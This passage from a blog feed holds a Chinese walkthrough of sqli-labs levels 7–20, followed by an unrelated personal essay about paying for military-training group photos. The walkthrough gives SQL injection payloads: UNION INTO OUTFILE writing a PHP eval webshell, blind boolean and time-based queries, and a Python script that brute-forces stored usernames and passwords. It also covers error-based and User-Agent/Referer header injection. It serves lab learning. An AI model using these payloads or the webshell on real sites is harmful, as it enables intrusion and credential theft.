study搭建的，所以需要把该文件上传至<code>PHPTutorial\WWW</code>目录下（不同版本的phpstudy路径可能不同，而至于实际渗透环境中，这个目录就需要靠方法找了，这里提供一个<a href="https://blog.csdn.net/YQavenger/article/details/108967912">别人的方法-来自csdn</a>），再使用菜刀或蚁剑链接就可以了。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">...?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;))union select &quot;hello world!&quot;,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;,&quot;hacked!&quot; into outfile &quot;E:\\PHPTutorial\\WWW\\a.php&quot; %23</span><br><span class="hljs-string">//select 的值会写进文件中，若想写入字符串字符串需要用单引号或双引号闭合</span><br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png" alt="img"></a></p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png" alt="img"></a></p><p>因为是直接上传了木马，连接成功的话就能直接控制服务器了。</p><hr><h3 id="8-10"><a href="#8-10" class="headerlink" title="8~10"></a>8~10</h3><p> 这里开始接触盲注，（盲注：后台使用了一些方法屏蔽了报错信息，此时无法通过报错信息进行注入的判断）同时这也是最常见的sql注入。</p><p>盲注又大概分为布尔型和时间型，其中第8关是布尔型，9、10关是时间型。</p><p><strong>另外因为盲注会比较繁琐，所以有必要学会使用，编写脚本。</strong></p><p>接下来我会从手注并配合python脚本的方式来完成。</p><p>第8关：</p><ul><li><p>输入单双引号，观察显示信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数（能行但没用）</p><p>因为显示的信息只有两种情况，语句正确时显示一句话”You are in…“,语句错误时没有显示。我们就只能利用这个信息，靠猜的方式去完成注入。这就是使用基于bool类型的注入。</p><p>就像这样：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 5 --+，无显示 (显示异常)</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>()) = <span class="hljs-number">6</span> <span class="hljs-comment">--+，显示“you are in...”（显示正常）</span><br>输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 7 --+，显示异常</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>()) = <span class="hljs-number">8</span> <span class="hljs-comment">--+，显示正常</span><br>//说明数据库名长度为<span class="hljs-number">8</span>个字符。<br></code></pre></div></td></tr></table></figure><p>即像这种一步步爆破的方式。这还只是得到了一个模糊的信息，注入的工作还远远没完成。所以学会利用工具是很有必要的。</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">97</span>（小写字母a的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值小于<span class="hljs-number">122</span>（小写字母z的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">109</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">109</span>（小写字母m的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不小于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不大于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br><br><span class="hljs-comment">//substr(xxx,y,z)，指的是从xxx中第y个字符开始取出z个字符。</span><br><span class="hljs-comment">//所以数据库名的第一个字符的ascii值为115，即小写字母s。</span><br><span class="hljs-comment">//其它位依次操作，得到结果security</span><br></code></pre></div></td></tr></table></figure><p>下面是关于用脚本解决的部分。</p><p>关于脚本的编写请见我这一篇文章，传送门：<a href="https://eggswoo.com/2021/06/16/py-script-sql-injection/">用python编写一个sql注入脚本 - 蛋窝窝 (eggswoo.com)</a></p><p>这个脚本比较low，但具备了完成该任务的基本功能，要完成其他注入则需要升级。</p><p>payload:查找security.users中的password</p><p>对应运行结果</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png" alt="img"></a></p><p>9、10关：</p><p> 因为无论传什么参数结果界面都完全不变，视觉上没有任何信息。所以采用基于时间的盲注方法。</p></li></ul><p> 判断语句是否闭合就需要用到sleep函数</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">输入...id=<span class="hljs-number">1</span><span class="hljs-string">&quot; and sleep(5) %23//页面很快有反应，sleep函数没能生效，证明语句闭合失败输入...id=1&#x27; and sleep(5) %23//等待5秒后页面刷新，证明语句闭合成功 </span><br></code></pre></div></td></tr></table></figure><p>开始构造payload</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">.../?id=<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;and</span> <span class="hljs-keyword">if</span>(database()=<span class="hljs-symbol">&#x27;security</span>&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)<span class="hljs-comment">--+</span><br>//同样页面延迟了<span class="hljs-number">5</span>秒刷新，证明当前数据库名为security<br></code></pre></div></td></tr></table></figure><p>最后贴上用脚本的截图</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png" alt="img"></a></p><hr><h3 id="11-12"><a href="#11-12" class="headerlink" title="11~12"></a>11~12</h3><p> 从这里开始由get类型的注入转变为post类型的注入。之前都是可以直接在浏览器地址栏进行的get类型的注入，而通常post传送的数据不能在url上看到，只能通过抓包工具(burpsuite)或者浏览器插件（hackbar）进行查看。无论我们在他给出的登录框怎么输入，上面的url地址栏都不会产生变化。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0[%7DF[P%7BHGS9$L%60ZUP9G8S8B.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0%5B%7DF%5BP%7BHGS9$L%60ZUP9G8S8B.png" alt="img"></a></p><p>而在登录框中构造的语句仍然是有效的，因为我们输入的就是post所上传的数据。</p><p>当我在username栏末尾输入‘时报错。从这个报错语句中即可以看出这里的sql语句是以单引号闭合的。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png" alt="img"></a></p><p>这里的username和password都是注入点，任选一个都可以使用语句注入。</p><ul><li>输入单双引号，观察报错信息，构造命令使语句闭合</li><li>使用 order by 语句判断字段数</li><li>构造语句查询数据库的信息</li></ul><p>所有步骤和1~4关的都一样，只是注入方式由get变为post,我们输入的工具语句也由在url中输入变为在表单中输入。另外注入符用#而不是%23，因为我们输入的语句不再经过浏览器url解析了。</p><p>12就是语句双引号加单小括号闭合，注入方法不变。</p><hr><h3 id="13-14"><a href="#13-14" class="headerlink" title="13-14"></a>13-14</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">这两关名字叫做<span class="hljs-built_in">post</span>类型的双重注入，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。通过报错信息闭合语句并查询完字段数后，根据前<span class="hljs-number">5</span>~<span class="hljs-number">6</span>关<span class="hljs-built_in">get</span>类型的双重注入经验可先按照以往<span class="hljs-built_in">get</span>类型的双重注入来尝试，果然成功了。<br></code></pre></div></td></tr></table></figure><p>语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a #<br></code></pre></div></td></tr></table></figure><p>对应结果</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png" alt="img"></a></p><p>而第14关就是语句的闭合方式变为双引号，可按照同样的方式进行注入。</p><hr><h3 id="15-16"><a href="#15-16" class="headerlink" title="15~16"></a>15~16</h3><p> 这两关是post类型的盲注。有了之前get类型中盲注的经验，这两关也就不那么复杂了。</p><p>此时的页面是不会提供一丁点信息的，语句正确与否只会弹出一张图片来告诉我们是否登录成功，而这个信息对我们来说是没用的，所以想到利用盲注的方法来进行注入。在尝试bool型盲注无效后转为用time类型的盲注。</p><p> 完善了一下之前的脚本，顺利完成任务。贴一下脚本的主要代码：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-meta">#playload:</span><br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;  &#x27;</span><br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;  &#x27;</span><span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;  &#x27;</span><br># <span class="hljs-keyword">select</span> group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<br>dic = <span class="hljs-string">&#x27;&#x27;&#x27;abcdefghijklmnopqrstuvwxyz,_ 0123456789()~`!@#$%^&amp;*-=+[]&#123;&#125;;:&#x27;</span>&quot;|\,&lt;.&gt;/?&#x27;&#x27;&#x27;#基于这个字典循环爆破<br>string = &#x27;&#x27;<br>url = &quot;http://<span class="hljs-number">192.168</span><span class="hljs-number">.147</span><span class="hljs-number">.181</span>/sqli-labs-master/Less<span class="hljs-number">-15</span>/&quot;<br>for i in range(1, 100)  <br>for j in dic:<br>    payload = &#x27;&#x27;&#x27;admin&quot;)<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(substr((<span class="hljs-keyword">select</span> group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),&#123;&#125;,<span class="hljs-number">1</span>)=&#123;&#125;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)#<span class="hljs-string">&#x27;&#x27;&#x27;.format(int(i), ascii(j))</span><br><span class="hljs-string">        # 针对不同题目修改payload与data</span><br><span class="hljs-string">         data = &#123;</span><br><span class="hljs-string">                &#x27;</span>unam<span class="hljs-string">e&#x27;: payload,</span><br><span class="hljs-string">                &#x27;</span>passwd<span class="hljs-string">&#x27;: &#x27;</span>&amp;submit=Submit<span class="hljs-string">&#x27;</span><br><span class="hljs-string">         &#125;</span><br><span class="hljs-string">          # print(data)</span><br><span class="hljs-string">         response = requests.post(url, data=data)</span><br><span class="hljs-string">         sec = response.elapsed.total_seconds()</span><br><span class="hljs-string"></span><br><span class="hljs-string">         if sec &gt; 2: </span><br><span class="hljs-string">         string += j</span><br><span class="hljs-string">            print(string)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">print(string)</span><br></code></pre></div></td></tr></table></figure><p>爆破的部分结果图：</p><p>有点奇怪为什么账号和密码用的是y来隔开，依照我用的语句应该是~隔开才对</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;&#x27;admin&quot;)and if(substr((select group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users),&#123;&#125;,1)=&#123;&#125;,sleep(3),1)#&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(i), <span class="hljs-built_in">ascii</span>(j))<br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png" alt="img"></a></p><hr><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p>这道题有提示说是password reset，通过尝试登录可以发现这关会检测你输入的用户名，当用户名错误的时候会显示友好的提示来鼓励你</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211641.png"></p><p>而用户名正确时会弹出不一样的界面：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211808.png"></p><p>它会提示你密码已更新。</p><p>尝试在password处构造一些基本的sql注入语句，都失败了。如图所示order by字段数都查不了。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910213407.png"></p><p>在这里我们又需要另一种方法——报错注入</p><p>（其实第5、6关也能用报错注入，这是在有报错语句提示的时候也许就能用上的方法）</p><p>报错注入可分别使用以下两种函数 ：</p><ul><li>extractvalue（）</li><li> updatexml（）</li></ul><p>基本格式：</p><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">?id=1<span class="hljs-built_in"> and/or </span>updatexml(1,(payload),1)<br>?id=1<span class="hljs-built_in"> and/or </span>extractvalue(1,concat(0x7e,(payload),0x7e))<span class="hljs-comment">#</span><br>//仍然需要先尝试使用单双引号来先闭合语句再来构造sql注入语句<br></code></pre></div></td></tr></table></figure><p>在这里执行语句如下</p><p>(你会发现下面三种语句好像都不是固定的语法，我尝试找了下规则，还是觉得记住</p><p>**<code>extractvalue(1,concat(0x7e,(payload),0x7e))#</code>**这一种形式就好了)</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">//查询当前数据库</span><br>passwd=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(database(</span>))))#</span><br><span class="hljs-function"><span class="hljs-comment">//查询所有的数据库名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),1)#</span><br><span class="hljs-function"><span class="hljs-comment">//查user下的表名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))<span class="hljs-meta">#</span><br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20210910222943565.png"></p><p> <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910222833.png"></p><p>值得注意的是，这关不让直接查user表，当sql语句为    <code> and extractvalue(1,concat(0x7e,(select group_concat(username) from security.users),0x7e))#</code>会弹出如下结果：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911105416.png"></p><p>所以需要换个名字绕过</p><p><code>and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e))</code></p><p>另外我发现我数据库中好像所有的password都没了，像是这样。。。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154244.png"></p><hr><h3 id="18-20"><a href="#18-20" class="headerlink" title="18~20"></a>18~20</h3><p>通过提示并查看源码可知第18关的注入点不在username和password上了，而在数据包的User-Agent处。</p><p>通过尝试构造sql注入语句发现有报错信息，所以继续采取报错注入</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152728.png"></p><p><code>User-Agent: 1&#39;and extractvalue(1,concat(0x7e,(database()),0x7e)) and &#39;1&#39;=&#39;1</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152654.png"></p><p>成功查询到当前数据库名。</p><p>另外这里的语句末尾并不是用注释符#闭合，而是’1‘=’1来闭合。</p><p>剩下的步骤就是利用报错注入，不再重复。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911153419.png"></p><p>而第19关就从ua变成了Referer</p><p><code>Referer: &#39;and extractvalue(1,concat(0x7e,(database()),0x7e))  and&#39;1&#39;=&#39;1</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154938.png"></p><p>不再赘述。</p><p>20关是在cooki处</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911155830.png"></p><hr><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><hr><ul><li><p>1~4 GET - Error base 类型，很直白的把信息都显示出来，没啥好说的。</p></li><li><p>5~6 GET -double 类型，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。用到了mysql数据库rand,group_by,count函数结合使用的特性（bug？），原理有点复杂，和前面基础类型相比，就结果而言其实就是order by后面的步骤中，</p><p><code>union select 1,2...</code> 变成了</p><p><code>union select count(*),concat( (select ..), floor(rand(14)*2))as c from 任一一个表名 group by     c</code></p><p>另外，group_concat拼接在语句中会失效（不知道为啥），使用limit语句作为代替来查询 more than 1 row 的数据。</p></li><li><p>7 GET -Dump into out file 类型，文件上传漏洞。使用into outfile函数，指定服务器上的绝对路径可实现上传文件，可用来上传一句话木马<code> &lt;?php @eval($_POST[&quot;密码&quot;]);?&gt;</code>，配合中国菜刀（攻击工具）达成目的。</p><p><em>小插曲：我就在这里写了个一句话木马（虽然在这里并不起作用），win10 的defender还是检测到了并弹出了危险警告。真是苦了defender能在我写的一堆垃圾中还找到疑似病毒的东西</em></p></li></ul><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg" alt="img"></a></p><p>不过这防火墙是真烦人，打开文件就报毒，搞得我都误删了一次，还得把相关文件夹加进白名单。</p><ul><li><p>8 GET - Blind - Boolian Based 类型 掌握一些截取字符的函数。从这开始最好就要学会使用脚本工具了。</p></li><li><p>9~10 GET - Blind - Time Based 类型 掌握sleep函数。</p><p>盲注是最常见的sql注入类型，所以有必要仔细掌握。盲注采取的攻击语句并没什么变化，只是多了截取字符与字典比较的过程，这种爆破的思路很适合用脚本解决。</p></li><li><p>11~12 POST-Error Based 类型 接触到post类型的注入，最大的变化是不通过url地址栏，而是通过上传数据的表单进行注入攻击了，语句也不再通过浏览器url解析，如注释符“#”直接用而不再是用“%23”。</p></li><li><p>13~14 POST-double 类型。方法同get。</p></li><li><p>15~16 POST-Blind 类型。（虽说关卡名字说是布尔注入，但我没找到语句正确与错误时返回页面的不同，可能需要抓包来看了）。同样用python脚本解决，对python的掌握程度要求并不高。</p></li><li><p>17 POST-Update类型。利用已有账户，对其修改密码处注入，注入方式为报错注入。用到了extractvalue()或updatexml()函数</p></li><li><p>18~20 POST header/cookie 类型。就是注入的位置不在明显的页面中，而在数据包内。后面这几关都是采取的报错注入的方式。</p></li></ul><hr><p>断断续续弄了这么久，终于做完了前20关…有缘再写后面的了</p><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不为五斗米取照片</title>
    <link href="/2021/05/16/%E4%B8%8D%E4%B8%BA%E4%BA%94%E6%96%97%E7%B1%B3%E5%8F%96%E7%85%A7%E7%89%87/"/>
    <url>/2021/05/16/%E4%B8%8D%E4%B8%BA%E4%BA%94%E6%96%97%E7%B1%B3%E5%8F%96%E7%85%A7%E7%89%87/</url>
    
    <content type="html"><![CDATA[<hr><p>本来该九月份军训的，因为新冠肺炎推迟到了次年五月。</p><p>今天是军训的第七天。</p><p>上午，教官再次提了集体照的事。</p><span id="more"></span><hr><p>教官是个什么职业？</p><p>教官们可能都普遍有个军人身份。褪去之后，也是老百姓，要上班的。</p><p>教官，兼职罢了，和家教那种挺像的。当然这只是个人看法。（我贱民可不敢把话说太狂……）</p><p>人总想着赚钱，就开创了副业。</p><p>教官们也有副业，开照相馆的。</p><p>同室友聊天才知道，我们的教官头子，教官们叫他参谋长，是开照相馆的，微信号就是他照相公司营业的号。</p><hr><p>军训的第三四天左右，教官就开始说照集体照的事。</p><p>大意是：</p><p>过两天所有人都要拍集体照，照片15块一张，自愿购买，不买就没照片，去外面照相还不止这个价，就只有这两天时间交钱。</p><p>毕竟这可能是我们人生中最后一次军训了，值得回忆巴拉巴拉……</p><p>话说的好听且在理，但我不是很想要照片，纯属个人原因。</p><p>15块不贵也值一顿午饭，应该比一张我几乎不会用到的纸划算。</p><p>当然，目前为止合情合理，额外提供实际服务，绝对自愿。</p><p>而一想到参谋长微信的传闻我就感觉事情没这么简单。</p><p>后面几天，训练的时候教官在操场催交钱，同时微信群收款行云流水。我有理由认为建立微信群相当大的一个理由就是方便收钱。</p><p>说是自愿，100人左右的连队只有大概30%的人交钱时，我们教官满脸不高兴，说是这两天截至，过了时间又一再延期。</p><p>催了数次，问了数次哪些人没交。</p><p>我们教官问一位训练得很好的同学，“你有没有交照片钱？” “交了”。</p><p>于是我们教官指着他对其他没交钱的同学说，“你看看！”，还挺骄傲的。</p><p>这是叫我们向榜样学习呢。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/WQNMD_txbb.png"></p><p>我默不作声，随你便吧。</p><p>而真正让我觉得离谱的，是照相过后发生的事。</p><hr><p>连队一个接一个照相，我们照完后在操场上休息。接着几个别的连队的教官过来叫我们集合，几个连坐在一起。</p><p>教官们又要催交钱。这破事还要集体做次思想工作。</p><p>要是开学日期能像交钱这回事的截至日期一样一再延迟就好了。</p><p>教官们这次来催钱的方式很奇特。</p><p>他们派了一个演说家，也是一位教官头头，平时拿着话筒发号施令，也常来视察方队的训练情况。</p><p>第一次我们见到他的时按照礼节问候说，教官好，他说不得行，该叫大哥好，因为他是我们团的老大。</p><p>我们说“大哥好！”</p><p>他说道，”喔对头！这个团我管事！晚上夜训，想不想我罩着你们？带你们尽情的耍，我说了算！“</p><p>我们几个连队都在笑，有大哥好啊。</p><p>”前提是你们要把自己的事做好哈！只要你们做好了，想咋个耍咋个耍！“另外的教官说道”懂得都懂。“</p><hr><p>同学们懂了，他们戏称15块充个剩下7天军训vip。</p><p>我也懂了。要我叫你大哥还要给你钱。斯德哥尔摩综合症是吧。没本事还想站着把钱挣了。</p><p>军训照片，我的回忆，他们的人民币。药药切克闹。</p><p>我不为五斗米取照片。</p><p>怎么训练我无所谓的，我不仅铁了心不要照片，顺手还退了微信的群。我管你是不是有什么照片率的指标要完成。</p><p>”大哥“说了一圈过后，要照片的人多了不少。</p><p>接着，我们教官要求发收款码的同学念一下交了钱的人的名字。</p><p>在他念名字的途中，我猜又多了不少”想“要照片的。</p><p>还红脸白脸轮番来，就差一句坦白从宽抗拒从严了。</p><p>我们教官念完名字说到”没交钱的站起来。</p><p>不站起来他也发现不了。</p><p>可他凭什么让我站起来。</p><p>我想到的可不是什么人在屋檐下，不得不低头，而是深明大义宁折不屈。我站起来准备接收“表扬”。</p><hr><p>同我的一同站起来的还有前面几个同学。教官挨个单独问话，他们有的说什么没加群马上加群啊，刚刚才交完钱啊…….站起来几个人又补交了不少。</p><p>我本想说，就是不想要照片，但被教官单独问到”你为什么不交钱“时却只蹦出来一个字，”穷。“</p><p>”那你坐下吧。“</p><p>结束了。</p><p>我原以为会有一场据理力争荡气回肠的battle呢。靠。</p><p>之前那几位没交钱的同学，究竟是怎么想的呢……</p><hr><p>现在回想起来，我该直接就说不想要的。</p><p>有多少同学是迫于压力才要照片的呢，教官们究竟会不会或者已经越界了呢，不得而知了。</p><hr><p>另：</p><p>当天晚训的时候还是按照常规训练。</p><p>我们连队里有以下两个极具代表性的声音：</p><p>1.”我大哥喃？？来带我耍啊？“</p><p>2.“RNM！退钱！！！”</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/RNM_tq.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建自己的博客</title>
    <link href="/2021/05/15/%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/05/15/%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
